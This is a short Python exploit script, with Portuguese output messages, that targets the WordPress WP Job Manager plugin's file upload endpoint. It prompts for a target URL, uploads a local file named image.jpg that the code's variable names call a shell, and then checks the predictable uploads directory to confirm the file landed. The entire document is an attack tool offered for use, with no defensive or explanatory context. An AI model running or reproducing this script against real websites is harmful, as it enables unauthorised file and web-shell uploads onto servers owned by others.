try:
	import requests
except:
	print("Modulo 'requests' nao instalado!\nExecute: pip install requests")
import sys
import re

###############################################################################

arquivo = "image.jpg"
url = input("[*] enter target: ")
ano = "2019"
mes = "08"

###############################################################################
vuln_dir = url + "jm-ajax/upload_file/"
shell = open(arquivo, "rb")
payload = {"files" : shell}
try:
    conexao = requests.get(vuln_dir)
    vulner = "files"
    if conexao.status_code == 200:
        if vulner in conexao.text:
            print("\n[#] Enviando Exploit(...)")
            injetar = requests.post(vuln_dir, files=payload)
            falha = "error" or "not found"
            if falha in injetar.text:
                print("[-] Job Manager")
            else:
                shl = url + "wp-content/uploads/job-manager-uploads/files/" + ano + "/" + mes + "/" + arquivo
                shell_dir = requests.get(shl)
                if shell_dir.status_code != 404:
                    print("[+] Job Manager ",shl)
                else:
                    print("[-] Job Manager")
        else:
            print("[-] Job Manager")
    else:
        print("[-] Job Manager")
except:
    print("[-] Job Manager")